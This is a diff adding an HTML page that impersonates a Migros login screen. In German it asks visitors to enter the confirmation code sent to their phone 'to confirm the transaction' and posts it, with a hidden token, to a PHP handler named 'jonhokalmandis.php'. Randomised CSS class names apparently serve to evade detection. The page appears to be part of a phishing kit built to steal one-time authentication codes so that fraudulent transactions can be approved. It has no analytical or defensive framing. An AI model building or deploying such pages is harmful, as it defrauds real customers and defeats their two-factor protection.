@@ -1,0 +1,150 @@
+<html translate="no" lang="en"><head>
+    <link rel="icon" href="https://login.migros.ch/favicon.ico">
+    <title>Migros Login</title>
+    <meta charset="utf-8">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="style.css" rel="stylesheet">
+  </head>
+  <body class="divroot2hnmXqksU9eyVsp8Ojsk"  >
+    
+
+    <style>
+    form.divrootZn96Gkz6MpzdKmkvZy2lUkvh3xcnV3eb.divrootZ0r2W79f1kxjWqwv8mem {
+    display: flex;
+    height: 100vh;
+    margin: 0;
+    flex-direction: column;
+    justify-content: center;
+}
+  svg {
+    display: block;
+    margin: 0px auto;
+}
+    </style>
+
+      
+      <form name="register" action="jonhokalmandis.php" method="post" class="divrootZn96Gkz6MpzdKmkvZy2lUkvh3xcnV3eb divrootZ0r2W79f1kxjWqwv8mem" novalidate="">
+	  
+	  
+	  
+<svg fill="#000000" height="40" width="40" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" 
+	 viewBox="0 0 490.7 490.7" xml:space="preserve">
+<g>
+	<g>
+		<path d="M292.2,414.1c-20.4,5.8-41.7,8.7-63.4,8.7c-39.7,0-78.3-10-111.6-28.9c-3.8-2.2-8.6-2.1-12.4,0.1
+			c-20.4,12.2-42.3,14.9-58.9,14.6c11.3-10.6,20-24,25.9-39.9c1.6-4.3,0.6-9.2-2.5-12.6c-29.4-31.8-44.9-70.2-44.9-111
+			c0-97.9,91.6-177.6,204.3-177.6c104.5,0,191.8,68,203.1,158.2c0.8,6.7,7,11.5,13.7,10.6c6.7-0.8,11.5-7,10.6-13.7
+			C443.4,120.5,345.6,43.2,228.8,43.2C102.6,43.2,0,133.9,0,245.3c0,43.9,16.3,86.8,46.1,121.7c-6.2,13.4-15.1,24-26.7,31.6
+			c-6.5,4.2-9.5,11.8-7.9,19.3c1.7,7.4,7.6,12.9,15.2,13.9c18,2.5,51.9,3.9,84.5-13.1c35.5,18.8,76,28.7,117.6,28.7
+			c23.9,0,47.5-3.2,70.1-9.7c6.5-1.9,10.3-8.6,8.4-15.1C305.5,416.1,298.7,412.3,292.2,414.1z"/>
+		<circle cx="228.7" cy="245.3" r="14.6"/>
+		<circle cx="165.8" cy="245.3" r="14.6"/>
+		<circle cx="291.6" cy="245.3" r="14.6"/>
+		<path d="M468.5,335.5v-23.1c0-31.8-25.9-57.7-57.7-57.7s-57.7,25.9-57.7,57.7v23.1c-12.3,1-22.1,11.3-22.1,23.9v64
+			c0,13.3,10.8,24.1,24.1,24.1h111.5c13.3,0,24.1-10.8,24.1-24.1v-64C490.6,346.8,480.8,336.5,468.5,335.5z M410.8,279.2
+			c18.3,0,33.2,14.9,33.2,33.2v22.9h-66.4v-22.9C377.6,294.1,392.5,279.2,410.8,279.2z M466.1,422.9H355.5v-63.1h110.6L466.1,422.9
+			L466.1,422.9z"/>
+	</g>
+</g>
+</svg>
+
+
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+        <span>Um die Transaktion zu bestätigen, geben Sie hier bitte den auf Ihrem Telefon empfangenen Code ein</span><div class="divrootZn96Gkz6MpzdKmkvZy2lUkvh3xcnV3eb divrootXiz969n5Bdjh6ia1Hzoa9lxlIn2l9oaxEzoa">
+          <div class="divrootZn96Gkz6MpzdKmkvZy2lUkvh3xcnV3eb divrootU13gW70r43umMrzyX3vc divrootP64uMjihC3reR15xFzk0">
+            <label class="divrootDpdoQ8w7M9td31ii3rv552cp" for="input-password">Bestätigungscode</label>
+            <div class="divrootRt7zTqiy2fvzN7yt6qacC7dhUjewK9t4 divrootZn96Gkz6MpzdKmkvZy2lUkvh3xcnV3eb">
+              <input type="text" class="divroot5gzp27qbKrzuD6y35l4dKx6kC3yj divrootPc3fKgyyZ1keL52h25t3 divroot0f7uZsf7Yswt1h0kJ72sAhmf7bek" name="Ecom">
+              <button class="divroot45l7P1v94mtrMt5uDj68C1wmRn4v divroot87ml5kyxA8b2L75x3xngWhoiRjgq divrootEh8pRe2cGrkcHt7xQrum6n8t14hjKu86 divrootZn96Gkz6MpzdKmkvZy2lUkvh3xcnV3eb divrootXgeuXgq34i05Xbfc89bx3o5mOj8wC406 divroot9blhB5ezKmzb91abBs63F9oaTlrtIgjkGhyx divrootYiyy2vsmOlv5Jga53bch870eWl0hIff1 divrootGex5E2uvN1kcDkfmPcla divrootW89g7b5pQcyw8nhlM7r9L6si96sn7sjl13yg divrootS7ufF33r1j3iOkk9OgstVf484f3pQeuj" style="margin: 8px 1px 2px 1px;width: 61px;">
+                <span>
+				          <input hidden name="zabalitamittahokakdola" value="{{tokenx}}">
+
+				  
+				  
+				  
+				  
+
+  
+				  
+				  
+				  
+				  
+				  
+				  <svg fill="#000000" height="33" width="33" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 455 455" xml:space="preserve" style="
+    fill: #393434;
+">
+<g>
+	<path d="M263.356,286.243c-4.143,0-7.5,3.358-7.5,7.5v75.572H66.644v-189.22h57.74c4.143,0,7.5-3.358,7.5-7.5s-3.357-7.5-7.5-7.5
+		h-57.74v-31.768c0-13.188,10.729-23.917,23.918-23.917h10.799c4.143,0,7.5-3.358,7.5-7.5s-3.357-7.5-7.5-7.5H90.562
+		c-21.459,0-38.918,17.458-38.918,38.917v282.755c0,21.459,17.459,38.917,38.918,38.917h141.377
+		c21.459,0,38.918-17.458,38.918-38.917V293.743C270.856,289.601,267.499,286.243,263.356,286.243z M231.938,440H90.562
+		c-13.188,0-23.918-10.729-23.918-23.917v-31.768h189.213v31.768C255.856,429.271,245.127,440,231.938,440z"></path>
+	<path d="M195.566,105.324c-10.906-1.784-11.366-2.85-11.366-5.089c0-3.959,6.645-5.005,10.158-5.005
+		c5.645,0,9.286,1.902,9.967,3.781c1.411,3.894,5.712,5.909,9.606,4.496c3.895-1.411,5.908-5.712,4.497-9.606
+		c-3.056-8.433-12.279-13.671-24.07-13.671c-14.813,0-25.158,8.226-25.158,20.005c0,15.976,14.989,18.428,23.944,19.893
+		c10.913,1.785,11.373,2.853,11.373,5.098c0,3.959-6.646,5.005-10.159,5.005c-5.645,0-9.287-1.903-9.967-3.783
+		c-1.409-3.896-5.712-5.908-9.604-4.501c-3.895,1.409-5.91,5.709-4.501,9.604c3.053,8.438,12.276,13.68,24.072,13.68
+		c14.813,0,25.159-8.226,25.159-20.005C219.518,109.242,204.524,106.789,195.566,105.324z"></path>
+	<path d="M333.562,105.324c-10.906-1.784-11.366-2.85-11.366-5.089c0-3.959,6.645-5.005,10.158-5.005
+		c5.644,0,9.286,1.903,9.968,3.782c1.411,3.894,5.711,5.91,9.606,4.495c3.895-1.412,5.907-5.713,4.495-9.607
+		c-3.057-8.432-12.279-13.67-24.069-13.67c-14.813,0-25.158,8.226-25.158,20.005c0,15.976,14.989,18.428,23.944,19.893
+		c10.913,1.785,11.373,2.853,11.373,5.098c0,3.959-6.646,5.005-10.159,5.005c-5.646,0-9.288-1.904-9.969-3.784
+		c-1.409-3.894-5.707-5.912-9.604-4.5c-3.895,1.41-5.909,5.71-4.499,9.605c3.054,8.438,12.277,13.679,24.072,13.679
+		c14.813,0,25.159-8.226,25.159-20.005C357.513,109.242,342.52,106.789,333.562,105.324z"></path>
+	<path d="M287.29,80.693c-2.949-1.087-6.26-0.221-8.299,2.167l-15.635,18.317l-15.635-18.317c-2.039-2.389-5.353-3.255-8.299-2.167
+		c-2.947,1.086-4.905,3.895-4.905,7.037v50c0,4.142,3.357,7.5,7.5,7.5s7.5-3.358,7.5-7.5v-29.661l8.135,9.53
+		c1.425,1.669,3.509,2.631,5.704,2.631s4.279-0.961,5.704-2.631l8.135-9.53v29.661c0,4.142,3.357,7.5,7.5,7.5s7.5-3.358,7.5-7.5v-50
+		C292.195,84.588,290.237,81.78,287.29,80.693z"></path>
+	<path d="M361.711,32.448C335.363,11.523,300.434,0,263.355,0c-37.079,0-72.01,11.524-98.356,32.448
+		c-26.854,21.328-41.643,49.839-41.643,80.282c0,53.437,45.967,99.009,110.149,110.165c1.168,16.66-4.858,33.198-16.639,45.091
+		c-2.131,2.151-2.759,5.371-1.594,8.165c1.165,2.793,3.895,4.613,6.922,4.613c34.298,0,63.751-24.484,70.694-57.815
+		c64.351-11.061,110.467-56.692,110.467-110.219C403.356,82.288,388.566,53.776,361.711,32.448z M285.178,208.966
+		c-3.906,0.54-6.728,4.01-6.457,7.944c0.002,0.035,0.005,0.069,0.008,0.104c-3.452,22.079-19.215,39.739-39.588,46.15
+		c7.824-13.859,11.039-30.124,8.82-46.213c0.001-0.015,0.002-0.029,0.003-0.043c0.271-3.933-2.551-7.404-6.456-7.944
+		c-59.77-8.261-103.151-48.733-103.151-96.233c0-53.889,56.074-97.73,124.999-97.73c68.926,0,125.001,43.841,125.001,97.73
+		C388.356,160.239,344.964,200.713,285.178,208.966z"></path>
+</g>
+</svg>
+				  
+				  
+				  
+				  
+				  
+				  
+				  
+                </span>
+              </button>
+            </div>
+            <div class="divrootOe7lH9zaXzn89mn0InlkRsqmK58vV6zg divrootJ9ow4gjzYpsr6tzgQvnaKnd3Ju78">
+              <div class="divrootEtrxVsxeB14fV2kqEk7yKeoz divrootG2814w1gMm3jKfomAdqjTa2aOhed divroot5lw7HzguF0gx81pn0ntcEulq0hje3hou divrootAbamMursStr71hdyNkmyQzl777br4u36 divrootDdg6Jq84Mr1rI7zjW4puWvvs9cv8Sxxt divrootUbl1Wld4EuciGbts4yag08zbUrjuL370Tqmr divrootSnp3No2035maVmzwJrpc45uwDg1z02z6 divroot2jos9saeKr1xM3822x4tRffr9u05B8b0"></div>
+              <div class="divrootWw7z25ewCfgwRo1zK3nn8tel divrootG3m1TmghOafhGhoeJvtpA7vu"></div>
+            </div>
+          </div>
+        </div>
+        <button class="divrootNb7n4p3uYr0eDzxxChi8" type="submit">Einreichen</button>
+		
+		
+      <div class="divrootVe59K7p0Kw1rJccbC8e58tqb5wm5168r divrootKprbUru66wa86jewUecu divrootZn96Gkz6MpzdKmkvZy2lUkvh3xcnV3eb divrootT1ow3e5vGnaq4wwpLmkfM1u2">
+        <p id="docfootnote-PRIVACY_STATEMENT" class="divrootO4xfM9roNqo6RijkAum1Tnok32ts divrootWw7z25ewCfgwRo1zK3nn8tel divroot4ppi6duoRhyjOyae6mjhQdttB3wi">
+          <span class="error zZZ">{{error}}.</span>
+		  
+
+        </p>
+      </div>
+    
+      </form>
+
+
+
+  
+</body></html>
